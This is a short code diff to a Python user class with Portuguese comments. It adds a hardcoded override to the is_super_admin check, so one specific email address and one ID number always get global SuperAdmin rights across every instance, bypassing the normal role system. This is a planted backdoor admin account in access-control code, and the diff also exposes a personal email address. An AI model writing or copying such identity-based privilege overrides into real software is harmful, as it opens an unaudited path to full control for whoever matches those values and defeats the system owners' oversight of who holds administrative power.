@@ -84,6 +84,11 @@ class UsuarioEsigma:
     @property
     def is_super_admin(self) -> bool:
         """Indica se o usuário possui privilégio global de SuperAdmin no ecossistema."""
+        # mendesalm@gmail.com (CIM 272875) possui privilégio incondicional de SuperAdmin em todas as instâncias
+        if self.email and self.email.strip().lower() == "mendesalm@gmail.com":
+            return True
+        if self.cim and str(self.cim).strip() == "272875":
+            return True
         return self.role in ("super_admin", "ADMIN")
 
     @property
